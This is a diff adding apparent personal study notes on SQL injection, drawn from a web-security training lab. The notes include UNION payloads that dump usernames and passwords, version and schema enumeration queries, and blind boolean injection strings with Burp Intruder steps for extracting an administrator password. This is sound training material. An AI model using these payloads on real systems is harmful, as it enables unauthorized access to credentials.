@@ -171,3 +171,256 @@ If the column data type is not compatible with string data, the injected query w
 
 If an error does not occur, and the application's response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data.
 
+## Using a SQL injection UNION attack to retrieve interesting data
+
+When you have determined the number of columns returned by the original query and found which columns can hold string data, you are in a position to retrieve interesting data.
+
+Suppose that:
+- The original query returns two columns, both of which can hold string data.
+- The injection point is a quoted string within the `WHERE` clause.
+- The database contains a table called `users` with the columns `username` and `password`.
+
+In this example, you can retrieve the contents of the `users` table by submitting the input:
+
+```sql
+' UNION SELECT username, password FROM users--
+```
+
+In order to perform this attack, you need to know that there is a table called `users` with two columns called `username` and `password`. Without this information, you would have to guess the names of the tables and columns. All modern databases provide ways to examine the database structure, and determine what tables and columns they contain.
+
+## Retrieving multiple values within a single column
+
+In some cases the query in the previous example may only return a single column.
+
+You can retrieve multiple values together within this single column by concatenating the values together. You can include a separator to let you distinguish the combined values. For example, on Oracle you could submit the input:
+
+```sql
+' UNION SELECT username || '~' || password FROM users--
+```
+
+This uses the double-pipe sequence `||` which is a string concatenation operator on Oracle. The injected query concatenates together the values of the `username` and `password` fields, separated by the `~` character.
+
+The results from the query contain all the usernames and passwords, for example:
+
+```text
+... 
+administrator~s3cure 
+wiener~peter 
+carlos~montoya 
+...
+```
+
+Different databases use different syntax to perform string concatenation. For more details, see the [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).
+
+```request
+# This is one Burp request
+GET /filter?category='union+select+null,username+||+'~'+||+password+from+users-- HTTP/2
+Host: 0a6c004d03cf9e9b879115c6003000ee.web-security-academy.net
+Cookie: session=BX4PrmbQE249yKTVPdNNmMTz6z6o4Sh6
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Brave";v="123", "Not:A-Brand";v="8", "Chromium";v="123"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
+Sec-Gpc: 1
+Accept-Language: en-US,en;q=0.8
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+```
+
+## Examining the database in SQL injection attacks
+
+To exploit SQL injection vulnerabilities, it's often necessary to find information about the database. This includes:
+- The type and version of the database software.
+- The tables and columns that the database contains.
+
+## Querying the database type and version
+
+You can potentially identify both the database type and version by injecting provider-specific queries to see if one works
+
+The following are some queries to determine the database version for some popular database types:
+
+| Database type    | Query                     |
+| ---------------- | ------------------------- |
+| Microsoft, MySQL | `SELECT @@version`        |
+| Oracle           | `SELECT * FROM v$version` |
+| PostgreSQL       | `SELECT version()`        |
+
+For example, you could use a `UNION` attack with the following input:
+
+```sql
+' UNION SELECT @@version--
+' union select 'a',@@version#     #for mysql
+```
+
+This might return the following output. In this case, you can confirm that the database is Microsoft SQL Server and see the version used:
+
+```sql
+Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64) 
+Mar 18 2018 09:11:49 
+Copyright (c) Microsoft Corporation 
+Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
+```
+
+## Listing the contents of the database
+
+Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.
+
+For example, you can query `information_schema.tables` to list the tables in the database:
+
+```sql
+SELECT * FROM information_schema.tables
+```
+
+This returns output like the following:
+
+```sql
+TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE ===================================================== 
+MyDatabase    dbo           Products  BASE TABLE 
+MyDatabase    dbo           Users     BASE TABLE 
+MyDatabase    dbo           Feedback  BASE TABLE
+```
+
+This output indicates that there are three tables, called `Products`, `Users`, and `Feedback`.
+
+You can then query `information_schema.columns` to list the columns in individual tables:
+
+```sql
+SELECT * FROM information_schema.columns WHERE table_name = 'Users'
+```
+
+This returns output like the following:
+
+```sql
+TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE ================================================================= 
+MyDatabase        dbo         Users     UserId       int 
+MyDatabase        dbo         Users     Username   varchar 
+MyDatabase        dbo         Users     Password   varchar
+```
+
+This output shows the columns in the specified table and the data type of each column.
+
+```burp
+'+union+select+table_name,NULL+from+information_schema.tables--
+'+union+select+column_name,NULL+from+information_schema.columns+where+table_name+=+'users_zkcwhk'--
+'+union+select+username_dqppjc,password_puzzmb+from+users_zkcwhk--
+```
+
+## Blind SQL injection
+
+In this section, we describe techniques for finding and exploiting blind SQL injection vulnerabilities.
+
+### What is blind SQL injection?
+
+Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.
+
+Many techniques such as `UNION` attacks are not effective with blind SQL injection vulnerabilities. This is because they rely on being able to see the results of the injected query within the application's responses. It is still possible to exploit blind SQL injection to access unauthorized data, but different techniques must be used.
+
+### Exploiting blind SQL injection by triggering conditional responses
+
+Consider an application that uses tracking cookies to gather analytics about usage. Requests to the application include a cookie header like this:
+
+`Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`
+
+When a request containing a `TrackingId` cookie is processed, the application uses a SQL query to determine whether this is a known user:
+
+```sql
+SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
+```
+
+This query is vulnerable to SQL injection, but the results from the query are not returned to the user. However, the application does behave differently depending on whether the query returns any data. If you submit a recognized `TrackingId`, the query returns data and you receive a "Welcome back" message in the response.
+
+This behavior is enough to be able to exploit the blind SQL injection vulnerability. You can retrieve information by triggering different responses conditionally, depending on an injected condition.
+
+To understand how this exploit works, suppose that two requests are sent containing the following `TrackingId` cookie values in turn:
+
+```sql
+…xyz' AND '1'='1 
+…xyz' AND '1'='2
+```
+
+- The first of these values causes the query to return results, because the injected `AND '1'='1` condition is true. As a result, the "Welcome back" message is displayed.
+- The second value causes the query to not return any results, because the injected condition is false. The "Welcome back" message is not displayed.
+
+This allows us to determine the answer to any single injected condition, and extract data one piece at a time.
+
+For example, suppose there is a table called `Users` with the columns `Username` and `Password`, and a user called `Administrator`. You can determine the password for this user by sending a series of inputs to test the password one character at a time.
+
+To do this, start with the following input:
+
+```sql
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
+```
+
+This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than `m`.
+
+Next, we send the following input:
+
+```sql
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
+```
+
+This does not return the "Welcome back" message, indicating that the injected condition is false, and so the first character of the password is not greater than `t`.
+
+Eventually, we send the following input, which returns the "Welcome back" message, thereby confirming that the first character of the password is `s`:
+
+```sql
+xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
+```
+
+We can continue this process to systematically determine the full password for the `Administrator` user.
+
+>[!Note]
+>The `SUBSTRING` function is called `SUBSTR` on some types of database. For more details, see the SQL injection cheat sheet.
+
+```burp
+# verify that there is a table called users
+TrackingId=8HMU7LCZCrErt0Ax'+and+(select+'a'+from+users+limit+1)='a  
+
+# verify that a username called administrator exists
+TrackingId=8HMU7LCZCrErt0Ax'+and+(select+'a'+from+users+where+username='administrator')='a
+
+# determine how many characters are in the password of the administrator user
+ TrackingId=8HMU7LCZCrErt0Ax'+and+(select+'a'+from+users+where+username='administrator'+and+length(password)>1)='a
+## now send a series of values to guess its password
+```
+
+>[!Tip]
+>To automate the process of guessing the password I will follow the next steps:
+
+1. Send a series of follow-up values to test different password lengths. Send:
+    `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a`
+	Then send:
+    
+    `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a`
+    
+    And so on. You can do this manually using Burp Repeater, since the length is likely to be short. When the condition stops being true (i.e. when the "Welcome back" message disappears), you have determined the length of the password, which is in fact 20 characters long.
+2. After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use Burp Intruder. Send the request you are working on to Burp Intruder, using the context menu.
+3. In the Positions tab of Burp Intruder, change the value of the cookie to:
+    
+    `TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`
+    
+	This uses the `SUBSTRING()` function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.
+4. Place payload position markers around the final `a` character in the cookie value. To do this, select just the `a`, and click the "Add §" button. You should then see the following as the cookie value (note the payload position markers):
+    
+    `TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§`
+    
+5. To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lowercase alphanumeric characters. Go to the Payloads tab, check that "Simple list" is selected, and under **Payload settings** add the payloads in the range a - z and 0 - 9. You can select these easily using the "Add from list" drop-down.
+6. To be able to tell when the correct character was submitted, you'll need to grep each response for the expression "Welcome back". To do this, go to the **Settings** tab, and the "**Grep - Match**" section. Clear any existing entries in the list, and then add the value "Welcome back".
+7. Launch the attack by clicking the "Start attack" button or selecting "Start attack" from the Intruder menu.
+8. Review the attack results to find the value of the character at the first position. You should see a column in the results called "Welcome back". One of the rows should have a tick in this column. The payload showing for that row is the value of the character at the first position.
+9. Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the main Burp window, and the Positions tab of Burp Intruder, and change the specified offset from 1 to 2. You should then see the following as the cookie value:
+    
+    `TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a`
+    
+10. Launch the modified attack, review the results, and note the character at the second offset.
+11. Continue this process testing offset 3, 4, and so on, until you have the whole password.
+
+>[!Note]
+>For more advanced users, the solution described here could be made more elegant in various ways. For example, instead of iterating over every character, you could perform a binary search of the character space. Or you could create a single Intruder attack with two payload positions and the "Cluster bomb" attack type, and work through all permutations of offsets and character values.
+
